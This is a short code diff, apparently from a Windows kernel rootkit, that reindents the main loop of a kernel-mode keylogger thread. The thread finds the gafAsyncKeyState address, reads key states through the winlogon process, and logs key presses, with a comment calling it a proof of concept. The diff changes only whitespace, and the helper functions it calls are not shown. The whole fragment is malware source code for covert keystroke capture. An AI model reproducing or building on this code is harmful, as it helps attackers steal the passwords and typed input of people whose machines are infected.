@@ -480,15 +480,15 @@ BeGetGafAsyncKeyStateAddress()
 VOID
 BeKeyLoggerFunction(_In_ PVOID StartContext)
 {
-	UNREFERENCED_PARAMETER(StartContext);
+    UNREFERENCED_PARAMETER(StartContext);
 
-	PVOID GasAsyncKeyStateAddr = BeGetGafAsyncKeyStateAddress();
+    PVOID GasAsyncKeyStateAddr = BeGetGafAsyncKeyStateAddress();
 
-	while(true)
-	{
-		if (BeGlobals::LogKeys)
-		{
-			BeUpdateKeyStateMap(BeGlobals::WinLogonPid, GasAsyncKeyStateAddr);
+    while(true)
+    {
+	    if (BeGlobals::LogKeys)
+	    {
+		    BeUpdateKeyStateMap(BeGlobals::WinLogonPid, GasAsyncKeyStateAddr);
 
             //
             // Just a poc :)
@@ -498,18 +498,18 @@ BeKeyLoggerFunction(_In_ PVOID StartContext)
                 LOG_MSG("A key pressed\n");
             }
         }
-	}
+    }
 		
-	if (BeGlobals::Shutdown)
-	{
+    if (BeGlobals::Shutdown)
+    {
         KeSetEvent(&BeGlobals::hKeyLoggerTerminationEvent, IO_NO_INCREMENT, FALSE);
-		PsTerminateSystemThread(STATUS_SUCCESS);
-	}
+	    PsTerminateSystemThread(STATUS_SUCCESS);
+    }
 
     //
     // Sleep for 0.05 seconds
     //
-	LARGE_INTEGER Interval;
-	Interval.QuadPart = -1 * (LONGLONG)50 * 10000;
-	KeDelayExecutionThread(KernelMode, FALSE, &Interval);
+    LARGE_INTEGER Interval;
+    Interval.QuadPart = -1 * (LONGLONG)50 * 10000;
+    KeDelayExecutionThread(KernelMode, FALSE, &Interval);
 }
